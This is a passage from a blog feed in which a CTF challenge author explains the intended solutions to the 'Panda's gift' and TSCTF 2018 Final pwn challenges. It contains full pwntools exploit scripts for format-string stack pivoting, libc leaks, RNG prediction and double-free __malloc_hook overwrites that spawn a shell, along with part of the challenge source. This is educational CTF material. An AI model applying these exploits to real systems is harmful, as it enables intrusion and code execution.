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]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[胖哈勃Panda's gift 及 TSCTF 2018 FINAL出题笔记]]></title>
    <url>%2F2018%2F06%2F25%2Fpwnhub_Panda's_gift%2F</url>
    <content type="text"><![CDATA[胖哈勃Panda’s gift出题题目分析题目在main函数中首先提高了栈地址，去掉了部分栈地址随机化（后2字节），便于后续利用。 在init函数中，利用时间作为随机数种子，使用mmap伪随机生成2个内存块，地址可预测。作为题目中visitor_name、motto两个变量的可使用内存。 在login函数中，提供了三个功能。1. 向visitor_name赋值，长度最大为6字节。 2. 向motto赋值，长度最大为0x100字节。 3.打印motto的值。 上述三个功能由一个全局变量flag控制每个功能仅能调用一次。 漏洞设置1、 利用libc及固定时间，visitor_name、motto地址可预测。 2、 在login的set_name函数中，设置了一个6字节的格式化字符串漏洞，且漏洞仅能利用一次。 漏洞利用首先，题目在编译时开启了RELRO、NX、CANARY保护，使得got表不可写、不能通过简单溢出利用漏洞。 地址预测在链接远程服务器时同时启动脚本，利用python的cdll库与服务器同样的libc可以达到预测的两个地址的效果，如： 1234567891011121314if not debug: p = remote('127.0.0.1', 9999)#process('./pwn1') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') libc_run = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc_run.srand(libc_run.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')v2 = 0while (v2 &lt;= 0x10000 ): v2 = libc_run.rand() &amp; 0xFFFFF000;visitor_name = v2v2 = 0;while ((v2 &lt;= 0x10000 )|(visitor_name == v2)): v2 = libc_run.rand() &amp; 0xFFFFF000;motto = v2 printf格式化字符串利用因为题目本身仅存在一个显式漏洞，只能从该漏洞入手。 由于仅给了6字节的格式化字符串利用，因此考虑用%hn对rbp链写\x0000。 在0x400d31下断点后，可以看到栈结构如下： 1234567800:0000│ rbp rsp 0x7ffc5dc00110 —▸ 0x7ffc5dc00120 —▸ 0x7ffc5dc00150 —▸ 0x7ffc5dc00180 ◂— ...01:0008│ 0x7ffc5dc00118 —▸ 0x400d47 ◂— nop 02:0010│ 0x7ffc5dc00120 —▸ 0x7ffc5dc00150 —▸ 0x7ffc5dc00180 —▸ 0x7ffc5df09410 ◂— ...03:0018│ 0x7ffc5dc00128 —▸ 0x400eba ◂— jmp 0x400f4b04:0020│ 0x7ffc5dc00130 ◂— 0x005:0028│ 0x7ffc5dc00138 ◂— 0x100400bf806:0030│ 0x7ffc5dc00140 —▸ 0x4010bc ◂— and eax, 0x6e610064 /* &apos;%d&apos; */07:0038│ 0x7ffc5dc00148 ◂— 0xcc345db59e141600 当向rsp所指的位置利用 %6$hn 可以使得在函数返回到login函数时，login的rbp寄存器的后2字节被清零，造成栈迁移。而login函数在调用scanf函数时，使用rbp对格式化字符串寻址： 12345.text:0000000000400E0C mov rax, [rbp+var_10].text:0000000000400E10 mov rsi, rdx.text:0000000000400E13 mov rdi, rax.text:0000000000400E16 mov eax, 0.text:0000000000400E1B call __isoc99_scanf 因此，可以控制scanf格式化字符串的地址。 scanf格式化字符串控制上一条讲了printf格式化字符串利用方法，而在调用printf格式化字符串前，可以利用set_motto函数预先在栈上布置好相关的地址。 tip: 在出题时，我选择用抬高栈的方法使得使用printf格式化字符串利用后修改的rbp一定能落在set_motto使用过的栈中，set_motto从0xxxxxfffd0开始写入到0xxxxx00110结束，但由于栈是复用的，通过对题目调整，使得0xxxxxfffd0 - 0xxxxxffff8是不被栈的复用覆盖的。因此能保证做题时可以劫持栈地址，进一步劫持scanf格式化字符串 在set_motto函数中填入 ‘scanf格式字符串’.ljust(0x20,’0’) + motto的地址，可以将scanf的格式化字符串劫持为用户输入的格式化字符串。且仅有0x20长度 由于栈上没有可以控制数据，所以并不能对内存地址任意写。 scanf的处理特性是按照每一个参数顺序处理的，因此利用栈上的rbp链（第10个参数、第16个参数分别是两个函数栈的ebp位置）特性，构造’%dq%10\$pq%16\$pq\0’，可以达到任意写且能保证正常逻辑不崩溃的目的。 地址泄露当前已经可以构造内存任意写了，任意写劫持motto指针为got地址，可以泄露libc地址。 1p.sendline('3q'+hex(0x602058)+'q'+hex(elf.got['puts'])+'q') 由于flag变量限制，每个函数仅能调用1次，不能继续泄露了，所以对flag置零 1p.sendline('1q'+hex(0x602050)+'q'+hex(0)+'q') 使用libc中的environ环境变量，可以泄露栈地址 1p.sendline('3q'+hex(0x602058)+'q'+hex(libc.symbols['environ'])+'q') 劫持控制流由于存在canary，直接栈溢出不能用的，此时劫持控制流可以通过修改调用 text:0000000000400E1B call __isoc99_scanf 处的返回地址，相当于函数自修改返回地址，将其修改为one_gadget，就可以拿到shell了。 EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#coding:utf-8from ctypes import *from pwn import *import timedebug=1elf = ELF('./babyfmt')if debug: p= process('./babyfmt') context.log_level = 'debug' libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') libc_run = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc_run.srand(libc_run.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,'b *0x400d31\nb *0x400e1b\n')else: p = remote('127.0.0.1', 9999)#process('./pwn1') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') libc_run = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc_run.srand(libc_run.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') #gdb.attach(p,'b *0x400e1b\n')v2 = 0while (v2 &lt;= 0x10000 ): v2 = libc_run.rand() &amp; 0xFFFFF000;visitor_name = v2#mmap((void *)(signed int)v2, 0x1000uLL, 3, 34, -1, 0LL);v2 = 0;while ((v2 &lt;= 0x10000 )|(visitor_name == v2)): v2 = libc_run.rand() &amp; 0xFFFFF000;motto = v2#mmap((void *)(signed int)v2, 0x1000uLL, 3, 34, -1, 0LL); print '[+] motto ',hex(motto) p.recvuntil('&gt;')p.sendline('2')p.recvuntil('motto:')p.sendline('%dq%10$pq%16$pq\0'.ljust(0x20)+p64(motto))p.recvuntil('&gt;')p.sendline('1')p.recvuntil('name')p.sendline('%6$hn')p.recvuntil('&gt;')p.sendline('3q'+hex(0x602058)+'q'+hex(elf.got['puts'])+'q')libc.address = u64(p.recv(6).ljust(8,'\0') )- libc.symbols['puts']print "[+] system",hex(libc.symbols['system'])p.recvuntil('&gt;')p.sendline('1q'+hex(0x602050)+'q'+hex(0)+'q')p.recvuntil('&gt;')p.sendline('3q'+hex(0x602058)+'q'+hex(libc.symbols['environ'])+'q')#p.sendline('1q'+hex(libc.symbols['__malloc_hook'])+'q'+hex(libc.address +0x4526a ))#add("fmt",0x50,"%dp4nda%10$pp4nda%16$pp4nda\0","...".ljust(0x20,'c'))stack = u64(p.recv(6).ljust(8,'\0') ) &amp;0xfffffffffff00000 -0x300000print "[+] stack",hex(stack)p.recvuntil('&gt;')p.sendline('1q'+hex(0x602050)+'q'+hex(0)+'q')#p.recvuntil('&gt;')#p.sendline('1q'+hex(motto+12)+'q'+hex(0x007073303824))p.recvuntil('&gt;')p.sendline('1q'+hex(stack+0x128)+'q'+hex(libc.address+0x4526a)+'q')p.interactive()'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''' ##other 比赛网址 题目链接 ， 密码： 7nb6 在*ctf 2018里出现过一道scanf格式字符串的利用，那题比较没有canary，使用%256s就溢出执行rop了。见到考察自构格式化字符串的比较少，所以搞了一题，利用思路和bss段上的printf格式化字符串是类似的，结合printf和scanf搞了一个格式化字符串漏洞大礼包。在编译题目时对栈重新构造了一下，避免了做题去碰随机化的尴尬，在scanf格式化字符串长度那里可以再减小一点，我用了15个字节，在题目中预留了32字节的长度。 由于自己太菜了，忘了libc函数是没有canary保护的，在劫持scanf格式化字符串那里本身就可以劫持scanf的返回地址写ROP了，失去了后面跳板构造内存任意写的作用了，如果那里有canary的话只能按照预期的方法来做了。 拿到一血、二血的test_for_pwn、Swings 大佬都是用这个非预期出的，觉得还是有点失落，但大佬们还是真的很强。 不过，这次比赛名称用了Panda’s gift真的是比较暖心了，虽然题目被非预期了，但是还是学到了很多东西。 TSCTF 2018 FINAL PWN1 Writeup此题中留了3处可以获得flag的点 伪随机数预测题目中留了一个black-jack游戏，代码参考了pwnable.kr中题目的代码，但里面的漏洞和逻辑bug被我修复了，每一轮游戏可以下注，当达到一定分数时，可以拿到加密后的flag，此题问题在于初始化中调用了srand(time(0)/60)作为伪随机种子，只要在与服务器上程序启动的一分钟以内去生成随机数都是可以正确预测随机数的。相当于可以预测扑克牌生成的序列，当预测到这一轮电脑会赢的时候就下注$1，预测自己会赢的话就全部下注，过不了几轮就可以拿到加密后的flag，解密就可以了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174#coding:utf-8from pwn import *import timefrom ctypes import *debug=1last = list()ori = -1elf = ELF('./DNS_Server')if debug: libc=CDLL("/lib/x86_64-linux-gnu/libc.so.6") libc.srand(libc.time(0)/60) p= process('./DNS_Server') context.log_level = 'debug' #libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') #gdb.attach(p,'b set_motto\nb set_name')else: p = remote('172.16.20.11', 2111)#process('./pwn1') libc = ELF('./libc-2.23.so')def randcard(dealer): global last,ori if len(last)&gt;0: num = last[0]%13+1 last = last[1:] else: ori = libc.rand() num = ori%13+1 if num &gt;= 12: num = 10 elif num == 11: if dealer&lt;=10: num = 11 else: num = 1 else: num = num return numdef round(): global ori player = 0 dealer = 0 player_flag = 0 dealer_flag = 0 Hit = 0 Stay = 0 getrand()#,last player+=randcard(player) #print '--' p.recvuntil('Your Total is ') tmp =int(p.recvline()[:-1]) if (tmp!= player): print '[-] rand num1 wrong !with %d vs %d'%(tmp,player) exit(0) p.recvuntil('The Dealer Has a Total of ') dealer+=randcard(dealer) tmp =int(p.recvline()[:-1]) if (tmp!= dealer): print '[-] rand num2 wrong !%d vs %d'%(tmp,dealer) exit(0) while(1): if player == 21: #print '[+++]1 d,p',dealer,player,last return 1,Hit,Stay if player&lt;=21: if player_flag!=1: card_type = getrand() card_num = randcard(player) if (player + card_num )&lt;=21: player+=card_num Hit +=1 else: last.append(card_type) last.append(ori) player_flag =1 Stay = 1 if dealer&lt;17: dealer += randcard(dealer) if dealer==21: #print '[+++]2 d,p',dealer,player,last return 0,Hit,Stay if dealer&gt;21: #print '[+++]3 d,p',dealer,player ,last return 1,Hit,Stay else: if dealer&lt;17: dealer += randcard(dealer) if dealer&gt;=17: if player&gt;=dealer: #print '[+++]4 d,p',dealer,player ,last return 1,Hit,Stay if player&lt;dealer: #print '[+++]5 d,p',dealer,player ,last return 0,Hit,Stay if dealer&gt;21: #print '[+++]6 d,p',dealer,player ,last return 1,Hit,Stay # (p.recvuntil(Your Total is ))def getrand(): global last_two,last if len(last)&gt;0: num = last[0] last = last[1:] #print '[***]',last else: num = libc.rand() return numwin = 0p.recvuntil('&gt;')p.sendline(str(0xbabe)) p.recvuntil('Y/N')p.sendline('Y')p.recvuntil("Choice:")p.sendline('1')while 1: ''' if win&gt;=6: p.recvuntil('flag :') flag = p.recv() flag_decrypt = "" for i in range(len(flag)): flag_decrypt += chr((getrand()%256)^ord(flag[i])) print flag_decrypt exit(0) ''' if ")b" in p.recvuntil(":"): p.recvuntil('flag :\n') flag = p.recv() flag_decrypt = "" for i in range(len(flag)): flag_decrypt += chr((getrand()%256)^ord(flag[i])) print flag_decrypt exit(0) p.recvuntil(' $') money = int(p.recvline()[:-1]) result,hit,stay = round() if result : p.recvuntil("$") p.sendline(str(money)) for i in range(0,hit): p.recvuntil("Please Enter H to Hit or S to Stay.") p.sendline("H") for i in range(0,stay): p.recvuntil("Please Enter H to Hit or S to Stay.") p.sendline("S") #win+=1 else: p.recvuntil("$") p.sendline(str(1)) for i in range(0,hit): p.recvuntil("Please Enter H to Hit or S to Stay.") p.sendline("H") for i in range(0,stay): p.recvuntil("Please Enter H to Hit or S to Stay.") p.sendline("S") p.recvuntil('Please Enter Y for Yes or N for No\n') p.sendline('Y')p.interactive() Double Free题目中有一个增加DNS和删除DNS的功能，在删除功能中按照domain名进行查找并Free，但仅把最后一个DNS节点指针置空，因此，两次Delete会造成Double Free。但是题目中我设置了一个坑点，在于DNS节点Free以前会检查是否是当前用户释放的，也就是name字段，当简单的double free时，由于fd指针位置已经被置为某地址了，所以不能通过检查而释放，此时发现检查字段用的是strcmp来比较的，将name字段设置为‘\x00’*7即可通过检查。比较简单的libc泄露地址方法是用unsorted bin未清空来做，泄露main_arena+88这个地址。以后的方法是常规套路：将Double Free转换为UAF，形成循环链表，劫持长度为0x70的fastbin链到__malloc_hook-0x30，以one_gadget覆写__malloc_hook，在申请堆块时候触发malloc从而拿到shell。 另外，堆漏洞由于我写错了一个函数，出现了一个堆溢出漏洞，膜一发以非预期解法解出题目的师傅 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#coding:utf-8from pwn import *import timedebug=1elf = ELF('./DNS_Server')if debug: p= process('./DNS_Server') context.log_level = 'debug' libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p)else: p = remote('172.16.20.11', 2111)#process('./pwn1') libc = ELF('./libc-2.23.so')def add(domain,length,remark,ip): p.recvuntil("&gt;") p.sendline("2") p.recvuntil("domain:") p.sendline(domain) p.recvuntil("length") p.sendline(str(length)) p.recvuntil("remark:") p.sendline(remark) p.recvuntil("IP:") p.send(ip)def delete(domain): p.recvuntil("&gt;") p.sendline("4") p.recvuntil("domain:") p.sendline(domain)def show(domain): p.recvuntil("&gt;") p.sendline("3") p.recvuntil("domain:") p.sendline(domain)def leak(): add("leak",0x100,"p4nda","...12345".ljust(0x20,'b')) add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) add("leak",0x100,"p4nda","...12345".ljust(0x20,'b')) add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) add("leak",0x100,"p4nda","...12345".ljust(0x20,'b')) add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) delete("leak") show("leak")leak()p.recvuntil("IP : ")libc.address = u64(p.recv(6).ljust(8,'\0')) - 88 - 0x10 - libc.symbols["__malloc_hook"]print '[+] system:',hex(libc.symbols['system'])p.recvuntil("IP : ")heap =u64(p.recv(4).ljust(8,'\0'))print '[+] heap:',hex(heap)p.recvuntil("&gt;")p.sendline('1')p.recvuntil('&gt;')p.sendline('1')p.recvuntil("name")p.sendline('\0'*6)p.recvuntil("&gt;")p.sendline('4')add("leak",0x100,"p4nda","...12345".ljust(0x20,'b'))add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) add("leak",0x100,"p4nda","...12345".ljust(0x20,'b'))#raw_input()add("step1",0x40,"p4nda","...".ljust(0x20,'1'))add("step1",0x40,"p4nda","...".ljust(0x20,'1'))delete("step1")delete("step1")delete("leak")#raw_input()add("step2",0x40,"p4nda",(p64(libc.symbols['__malloc_hook']-0x23)+"...").ljust(0x20,'1'))add("step3",0x40,"p4nda","...".ljust(0x20,'3'))add("step3",0x40,"p4nda","...".ljust(0x20,'3'))#raw_input()add("step4",0x40,"p4nda",("\0"*0x13+p64(libc.address +0x4526a )+"...".ljust(0x20,'0')))p.recvuntil("&gt;")p.sendline("2")p.interactive()'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''' 格式化字符串大礼包在set_name函数中有一个明显的格式化字符串漏洞，这个漏洞很多队伍拿来做地址泄露了，实际上也是可用的。首先七个字节，可用来写本函数中的rbp，向该位置用%hn写2字节\x00。在写完之后，在login函数的栈就被迁移到原来的栈的低地址位置了，而在set_motto函数中可以对这部分内存预先设置一下，可以达到控制scanf格式化字符串的目的，将这个格式化字符串劫持到堆上去，泄露堆地址的方法与Double Free中泄露方法是一致的，达到控制格式化字符串以后，需要考虑如何将scanf的格式化字符串用好。与格式化字符串在堆或bss段上的printf格式化字符串利用思路类似，可以在栈上先找一个地址链，向第一个地址写入，再对第二个地址写入，从而达到任意地址写，最终劫持puts@got 为system，以show_motto函数触发漏洞就可以拿到shell了。 利用流程是：以堆泄露libc、堆地址-&gt;在堆上预先布置好scanf格式化字符串-&gt;以set_motto预先布置好栈上数据-&gt;调用set_name对login函数做栈迁移-&gt;利用login函数的scanf写got表-&gt;触发show_motto函数拿到shell 这个就是一个简化版本的胖哈勃题目，出在这里想看一下有什么解法是我非预期的，当时线下赛的时候没有人用这个方法来做，还是没有想到上面提到的那个劫持返回地址… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#coding:utf-8from pwn import *import timedebug=0elf = ELF('./DNS_Server')if debug: p= process('./DNS_Server') context.log_level = 'debug' libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,'b set_motto\nb set_name')else: p = remote('172.16.20.17', 40111)#process('./pwn1') libc = ELF('./libc-2.23.so')def add(domain,length,remark,ip): p.recvuntil("&gt;") p.sendline("2") p.recvuntil("domain:") p.sendline(domain) p.recvuntil("length") p.sendline(str(length)) p.recvuntil("remark:") p.sendline(remark) p.recvuntil("IP:") p.send(ip)def delete(domain): p.recvuntil("&gt;") p.sendline("4") p.recvuntil("domain:") p.sendline(domain)def show(domain): p.recvuntil("&gt;") p.sendline("3") p.recvuntil("domain:") p.sendline(domain)def leak(): add("leak",0x100,"p4nda","...12345".ljust(0x20,'b')) add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) add("leak",0x100,"p4nda","...12345".ljust(0x20,'b')) add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) add("leak",0x100,"p4nda","...12345".ljust(0x20,'b')) add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) delete("leak") show("leak")leak()p.recvuntil("IP : ")libc.address = u64(p.recv(6).ljust(8,'\0')) - 88 - 0x10 - libc.symbols["__malloc_hook"]print '[+] system:',hex(libc.symbols['system'])p.recvuntil("IP : ")heap =u64(p.recv(4).ljust(8,'\0'))print '[+] heap:',hex(heap)add("fmt",0x50,"%dp4nda%10$pp4nda%16$pp4nda\0","...".ljust(0x20,'c'))p.recvuntil('&gt;')p.sendline('1') p.recvuntil('&gt;')p.sendline('2')p.recvuntil('motto:')for i in range(0,8): if(((heap+48)&gt;&gt;(8*i))&amp;0xff) ==0x0a: print "bad addr" exit(0)p.sendline('/bin/sh\0'+'a'*(0xf0-0x10-8)+p64(heap+48))p.recvuntil('&gt;')p.sendline('1')p.recvuntil('name')p.sendline('%6$hn')p.recvuntil("&gt;")p.sendline("3p4nda"+hex(elf.got['puts'])+"p4nda"+hex(libc.symbols['system'])+'p4nda')p.recvuntil('motto')p.sendline('p4nda')p.interactive() 题目源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913013113213313413513613713813914014114214314414514614714814915015115215315415515615715815916016116216316416516616716816917017117217317417517617717817918018118218318418518618718818919019119219319419519619719819920020120220320420520620720820921021121221321421521621721821922022122222322422522622722822923023123223323423523623723823924024124224324424524624724824925025125225325425525625725825926026126226326426526626726826927027127227327427527627727827928028128228328428528628728828929029129229329429529629729829930030130230330430530630730830931031131231331431531631731831932032132232332432532632732832933033133233333433533633733833934034134234334434534634734834935035135235335435535635735835936036136236336436536636736836937037137237337437537637737837938038138238338438538638738838939039139239339439539639739839940040140240340440540640740840941041141241341441541641741841942042142242342442542642742842943043143243343443543643743843944044144244344444544644744844945045145245345445545645745845946046146246346446546646746846947047147247347447547647747847948048148248348448548648748848949049149249349449549649749849950050150250350450550650750850951051151251351451551651751851952052152252352452552652752852953053153253353453553653753853954054154254354454554654754854955055155255355455555655755855956056156256356456556656756856957057157257357457557657757857958058158258358458558658758858959059159259359459559659759859960060160260360460560660760860961061161261361461561661761861962062162262362462562662762862963063163263363463563663763863964064164264364464564664764864965065165265365465565665765865966066166266366466566666766866967067167267367467567667767867968068168268368468568668768868969069169269369469569669769869970070170270370470570670770870971071171271371471571671771871972072172272372472572672772872973073173273373473573673773873974074174274374474574674774874975075175275375475575675775875976076176276376476576676776876977077177277377477577677777877978078178278378478578678778878979079179279379479579679779879980080180280380480580680780880981081181281381481581681781881982082182282382482582682782882983083183283383483583683783883984084184284384484584684784884985085185285385485585685785885986086186286386486586686786886987087187287387487587687787887988088188288388488588688788888989089189289389489589689789889990090190290390490590690790890991091191291391491591691791891992092192292392492592692792892993093193293393493593693793893994094194294394494594694794894995095195295395495595695795895996096196296396496596696796896997097197297397497597697797897998098198298398498598698798898999099199299399499599699799899910001001100210031004100510061007100810091010101110121013101410151016101710181019102010211022102310241025102610271028102910301031103210331034103510361037103810391040104110421043104410451046104710481049105010511052105310541055105610571058105910601061106210631064106510661067106810691070107110721073107410751076107710781079108010811082108310841085108610871088108910901091109210931094109510961097109810991100110111021103110411051106110711081109111011111112#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;math.h&gt;#include &lt;time.h&gt;#include &lt;fcntl.h&gt; //Used for srand((unsigned) time(NULL)) command//#include &lt;process.h&gt; //Used for system("cls") command #define spade 35 //Used to print spade symbol#define club 36 //Used to print club symbol#define diamond 37 //Used to print diamond symbol#define heart 38 //Used to print heart symbol#define RESULTS "Blackjack.txt" //File name is Blackjack#define WIN_SUM 65535 struct DNS_Node&#123; char user[8]; char domain[0x30]; char *ptr;&#125;;//Global Variablesint k;int l;int d;int won;int loss;int cash = 5;unsigned int bet;int random_card;int player_total=0;int dealer_total=0;char * visitor_name ;int login_flag=0;char * motto=0;struct DNS_Node *DNS_Node_List[0x20];//Function Prototypesint clubcard(); //Displays Club Card Imageint diamondcard(); //Displays Diamond Card Imageint heartcard(); //Displays Heart Card Imageint spadecard(); //Displays Spade Card Imageint randcard(); //Generates random cardint betting(); //Asks user amount to betvoid asktitle(); //Asks user to continuevoid rules(); //Prints "Rules of Vlad's Blackjack" menuvoid play(); //Plays gamevoid dealer(); //Function to play for dealer AIvoid stay(); //Function for when user selects 'Stay'void cash_test(); //Test for if user has cash remaining in pursevoid askover(); //Asks if user wants to continue playingvoid fileresults(); //Prints results into Blackjack.txt file in program directory//Main Functionint game(void)&#123; int choice1; puts("-*-*-*-*-*首家线上赌场上线了，性感泽哥女装发牌(・∀・)つ *-*-*-*-*-"); printf("\n"); printf("\n"); printf("\n"); printf("\n 222 111 "); printf("\n 222 222 11111 "); printf("\n 222 222 11 111 "); printf("\n 222 111 "); printf("\n 222 111 "); printf("\n"); printf("\n%c%c%c%c%c %c%c %c%c 